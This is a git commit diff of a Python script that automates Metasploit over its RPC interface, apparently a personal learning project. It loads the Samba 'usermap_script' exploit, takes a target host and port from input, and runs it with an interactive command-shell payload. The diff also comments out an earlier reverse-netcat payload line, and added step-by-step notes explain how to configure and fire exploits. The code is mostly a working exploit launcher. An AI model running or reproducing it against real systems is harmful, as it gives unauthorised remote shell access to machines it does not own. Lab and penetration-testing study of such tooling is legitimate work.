124944771793bafd49a61c0713c758cb9303587f
Daniel <padillaortiz.daniel099@gmail.com>
2022-05-28 23:29:57 -0400

    Figured out how to create a session with metasploit

--- Metasploit3-Py/import-msf.py
+++ Metasploit3-Py/import-msf.py
@@ -8,15 +8,28 @@ print('In termial type:\n\n msfconsole \n load msgrpc [pass=yourpasswd] \n')
 print('Take note of MSGRPC Password.\n')
 
 PASSWORD = input('Enter your password: ')
-
 client = MsfRpcClient(PASSWORD, port=55552, ssl=False)
 
-#clientExploitsDB = client.modules.exploits
-#print(len(clientExploitsDB))
+'''
+INSTRUCTIONS:
+    1. Set the exploit .modules.use('exploit', EXPLOIT_PATH)
+    2. Check required options with .missing_required
+        a. For all options use .options
+        b. Check option values use .runoptions
+    3. Set RHOSTS with [RHOSTS]
+    4. Check exploit payloads with .targetpayloads()
+    5. Set a payload with .modules.use('payload', PAYLOAD_PATH)
+        a. Step 2 sub steps apply here
+    6. Set LHOST with [LHOST]
+    7. Excute the exploit with .execute(payload)
+    8. Exploit successful if job_id == 1 and failed if we got None
 
-#clientPayloadsDB = client.modules.payloads
-#print(len(clientPayloadsDB))
+THOUGHTS:
+    Not all payloads and exploits will have easy to configure options so 
+    perhaps it's best to sort through the ones that just need a host or port 
+    confirgured and look at the more complicated ones later.
 
+'''
 
 exploit = client.modules.use('exploit', 'multi/samba/usermap_script')
 
@@ -32,10 +45,14 @@ exploit['RHOSTS'] = rhosts
 rport = input('Set RPORT: ')
 exploit['RPORT'] = rport
 
-payloads = exploit.targetpayloads()
+consoleID = client.consoles.console().cid
+console = client.consoles.console(consoleID)
+print(console.run_module_with_output(exploit, payload='cmd/unix/interact'))
+
+#payloads = exploit.targetpayloads()
 '''
 for payload in payloads:
     print(payload)
 '''
-print(exploit.execute(payload='cmd/unix/reverse_netcat'))
+#print(exploit.execute(payload='cmd/unix/reverse_netcat')`)
 
